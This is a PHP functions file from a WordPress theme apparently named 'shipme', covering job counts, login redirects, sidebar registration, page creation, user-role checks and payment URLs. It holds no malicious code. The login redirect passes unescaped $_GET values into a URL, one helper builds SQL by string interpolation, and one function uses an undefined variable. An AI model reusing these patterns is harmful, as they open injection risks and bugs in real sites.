 							$args = array('post_type' => 'job_ship', 'order' => 'DESC', 'orderby' => 'date', 'posts_per_page' => 1,
 							'paged' => 1, 'meta_query' => array($outstanding), 'author' => $uid);

 							$the_query = new WP_Query( $args );
 							$ff = $the_query->found_posts;

 							return $ff;
 }

 function shipme_get_nr_of_outsanding_bidder($uid)
 {
 	$outstanding = array(
 									'key' => 'outstanding',
 									'value' => "1",
 									'compare' => '='
 								);

 								$winner = array(
 									'key' => 'winner',
 									'value' => $uid,
 									'compare' => '='
 								);



 							$args = array('post_type' => 'job_ship', 'order' => 'DESC', 'orderby' => 'date', 'posts_per_page' => 1,
 							'paged' => 1, 'meta_query' => array($outstanding, $winner) );

 							$the_query = new WP_Query( $args );
 							$ff = $the_query->found_posts;

 							return $ff;
 }



 function shipme_get_nr_of_unpaid_bidder($uid)
 {
 	$outstanding = array(
 									'key' => 'unpaid_job',
 									'value' => "1",
 									'compare' => '='
 								);

 								$winner = array(
 									'key' => 'winner',
 									'value' => $uid,
 									'compare' => '='
 								);



 							$args = array('post_type' => 'job_ship', 'order' => 'DESC', 'orderby' => 'date', 'posts_per_page' => 1,
 							'paged' => 1, 'meta_query' => array($outstanding, $winner) );

 							$the_query = new WP_Query( $args );
 							$ff = $the_query->found_posts;

 							return $ff;
 }



 function shipme_get_nr_of_unpaid_owner($uid)
 {
 	$outstanding = array(
 									'key' => 'unpaid_job',
 									'value' => "1",
 									'compare' => '='
 								);




 							$args = array('post_type' => 'job_ship', 'order' => 'DESC', 'orderby' => 'date', 'posts_per_page' => 1,
 							'paged' => 1, 'meta_query' => array($outstanding, $winner), 'author' => $uid );

 							$the_query = new WP_Query( $args );
 							$ff = $the_query->found_posts;

 							return $ff;
 }


 		function shipme_do_login_register_init()
 		{
 		  global $pagenow;



 		  switch ($pagenow)
 		  {
 			case "wp-login.php":

        if(shipme_using_permalinks())
 			  wp_redirect(get_permalink(get_option('shipme_login_page_id')) . "?action=" . $_GET['action'] . "&_wpnonce=" . $_GET['_wpnonce']);
        else {
          wp_redirect(get_permalink(get_option('shipme_login_page_id')) .  "&action=" . $_GET['action'] . "&_wpnonce=" . $_GET['_wpnonce']);
        }

        exit;
 			break;
 			case "wp-register.php":



 			  wp_redirect(get_permalink(get_option('shipme_register_page_id')));
 			break;
 		  }
 		}


 function shipme_framework_init_widgets()
 {




 	register_sidebar( array(
 		'name' => __( 'Single Page Sidebar', 'shipme' ),
 		'id' => 'single-widget-area',
 		'description' => __( 'The sidebar area of the single blog post', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );




 			register_sidebar( array(
 		'name' => __( 'shipme - Stretch Wide MainPage Sidebar', 'shipme' ),
 		'id' => 'main-stretch-area',
 		'description' => __( 'This sidebar is site wide stretched in home page, just under the slider/menu.', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );



 		register_sidebar( array(
 		'name' => __( 'Other Page Sidebar', 'shipme' ),
 		'id' => 'other-page-area',
 		'description' => __( 'The sidebar area of any other page than the defined ones', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );




 	register_sidebar( array(
 		'name' => __( 'Home Page Sidebar - Right', 'shipme' ),
 		'id' => 'home-right-widget-area',
 		'description' => __( 'The right sidebar area of the homepage', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );




 	register_sidebar( array(
 		'name' => __( 'Home Page Sidebar - Left', 'shipme' ),
 		'id' => 'home-left-widget-area',
 		'description' => __( 'The left sidebar area of the homepage', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );



 	register_sidebar( array(
 		'name' => __( 'First Footer Widget Area', 'shipme' ),
 		'id' => 'first-footer-widget-area',
 		'description' => __( 'The first footer widget area', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );

 	// Area 4, located in the footer. Empty by default.
 	register_sidebar( array(
 		'name' => __( 'Second Footer Widget Area', 'shipme' ),
 		'id' => 'second-footer-widget-area',
 		'description' => __( 'The second footer widget area', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );

 	// Area 5, located in the footer. Empty by default.
 	register_sidebar( array(
 		'name' => __( 'Third Footer Widget Area', 'shipme' ),
 		'id' => 'third-footer-widget-area',
 		'description' => __( 'The third footer widget area', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );

 	// Area 6, located in the footer. Empty by default.
 	register_sidebar( array(
 		'name' => __( 'Fourth Footer Widget Area', 'shipme' ),
 		'id' => 'fourth-footer-widget-area',
 		'description' => __( 'The fourth footer widget area', 'shipme' ),
 		'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 		'after_widget' => '</li>',
 		'before_title' => '<h3 class="widget-title">',
 		'after_title' => '</h3>',
 	) );



 			register_sidebar( array(
 			'name' => __( 'shipme - Job Single Sidebar', 'shipme' ),
 			'id' => 'job-widget-area',
 			'description' => __( 'The sidebar of the single job page', 'shipme' ),
 			'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 			'after_widget' => '</li>',
 			'before_title' => '<h3 class="widget-title">',
 			'after_title' => '</h3>',
 		) );


 			register_sidebar( array(
 			'name' => __( 'shipme - HomePage Area','shipme' ),
 			'id' => 'main-page-widget-area',
 			'description' => __( 'The sidebar for the main page, just under the slider.', 'shipme' ),
 			'before_widget' => '<li id="%1$s" class="widget-container %2$s">',
 			'after_widget' => '</li>',
 			'before_title' => '<h3 class="widget-title">',
 			'after_title' => '</h3>',
 		) );



 }


 function shipme_insert_pages($page_ids, $page_title, $page_tag, $parent_pg = 0 )
 {

 		$opt = get_option($page_ids);
 		if(!shipme_check_if_page_existed($opt))
 		{

 			$post = array(
 			'post_title' 	=> $page_title,
 			'post_content' 	=> $page_tag,
 			'post_status' 	=> 'publish',
 			'post_type' 	=> 'page',
 			'post_author' 	=> 1,
 			'ping_status' 	=> 'closed',
 			'post_parent' 	=> $parent_pg);

 			$post_id = wp_insert_post($post);

 			update_post_meta($post_id, '_wp_page_template', 'shipme-special-page-template.php');
 			update_option($page_ids, $post_id);

 		}


 }

 function shipme_insert_pages2($page_ids, $page_title, $page_tag, $parent_pg = 0 )
 {

 		$opt = get_option($page_ids);
 		if(!shipme_check_if_page_existed($opt))
 		{

 			$post = array(
 			'post_title' 	=> $page_title,
 			'post_content' 	=> $page_tag,
 			'post_status' 	=> 'publish',
 			'post_type' 	=> 'page',
 			'post_author' 	=> 1,
 			'ping_status' 	=> 'closed',
 			'post_parent' 	=> $parent_pg);

 			$post_id = wp_insert_post($post);

 			update_post_meta($post_id, '_wp_page_template', 'full-width-page-template.php');
 			update_option($page_ids, $post_id);

 		}


 }

 function shipme_is_user_provider($uid)
 {
 	//if(!shipme_2_user_types()) return true;

 	//----------------------

 		$can_do_both = get_user_meta($uid, 'can_do_both', true);
 		if($can_do_both == "yes") return true;

 	//----------------------
 	$user_data = get_userdata($uid);

 	$user_roles = $user_data->roles;


 	if(is_array($user_roles))
     $user_role = array_shift($user_roles);
 	if($user_role == "transporter") return true;


 	if($user_role == "administrator") return true;

 	$user = get_userdata($uid);

 	if($user->user_level == 10) return true;
 	return false;
 }


 function shipme_is_transporter($uid)
 {
   //if(!shipme_2_user_types()) return true;

   //----------------------

     $can_do_both = get_user_meta($uid, 'can_do_both', true);
     if($can_do_both == "yes") return true;

   //----------------------
   $user_data = get_userdata($uid);

   $user_roles = $user_data->roles;


   if(is_array($user_roles))
     $user_role = array_shift($user_roles);
   if($user_role == "transporter") return true;


   if($user_role == "administrator") return true;

   $user = get_userdata($uid);

   if($user->user_level == 10) return true;
   return false;
 }


 function shipme_is_customer($uid)
 {
   return shipme_is_user_business($uid);
 }


 function shipme_is_user_business($uid)
 {
 	//if(!shipme_2_user_types()) return true;

 	//----------------------

 		$can_do_both = get_user_meta($uid, 'can_do_both', true);
 		if($can_do_both == "yes") return true;

 	//----------------------

 	$user = get_userdata($uid);


 	$user_roles = $user->roles;
 	if(is_array($user_roles))
     $user_role = array_shift($user_roles);
 	if($user_role == "customer") return true;

 	if($user_role == "regular_user") return true;
 	if($user_role == "administrator") return true;

 	if($user->user_level == 10) return true;
 	return false;


 }

 function shipme_get_credits($uid)
 {
 	$c = get_user_meta($uid,'credits',true);
 	if(empty($c))
 	{
 		update_user_meta($uid,'credits',"0");
 		return 0;
 	}

 	return $c;
 }

 function shipme_get_payments_page_url($subpage = '', $id = '')
 {
 	$opt = get_option('shipme_finances_page_id');
 	if(empty($subpage)) $subpage = "home";

 	$perm = shipme_using_permalinks();

 	if($perm) return get_permalink($opt). "?pg=".$subpage.(!empty($id) ? "&id=".$id : '');

 	return get_permalink($opt). "&pg=".$subpage.(!empty($id) ? "&id=".$id : '');
 }

 function shipme_get_payments_page_url2($subpage = '', $poid = '')
 {
 	$opt = get_option('shipme_finances_page_id');
 	if(empty($subpage)) $subpage = "home";

 	$perm = shipme_using_permalinks();

 	if($perm) return get_permalink($opt). "?pg=".$subpage.(!empty($poid) ? "&poid=".$poid : '');

 	return get_permalink($opt). "&pg=".$subpage.(!empty($poid) ? "&poid=".$poid : '');
 }


 function shipme_check_if_page_existed($pid)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."posts where post_type='page' AND post_status='publish' AND ID='$pid'";
 	$r = $wpdb->get_results($s);

 	if(count($r) > 0) return true;
 	return false;

 }

 function shipme_jquery_shp_as() {
     if ( !is_admin() ) { // actually not necessary, because the Hook only get used in the Theme
         wp_deregister_script( 'jquery' ); // unregistered key jQuery
         wp_register_script( 'jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js', false, '1.11.3'); // register key jQuery with URL of Google CDN
         wp_enqueue_script( 'jquery' ); // include jQuery
     }
 }
 add_action( 'after_setup_theme', 'shipme_jquery_shp_as' ); // Theme active, include function
 setcookie(TEST_COOKIE, 'WP Cookie check', 0, COOKIEPATH, COOKIE_DOMAIN);
 if ( SITECOOKIEPATH != COOKIEPATH ) setcookie(TEST_COOKIE, 'WP Cookie check', 0, SITECOOKIEPATH, COOKIE_DOMAIN);


 ?>
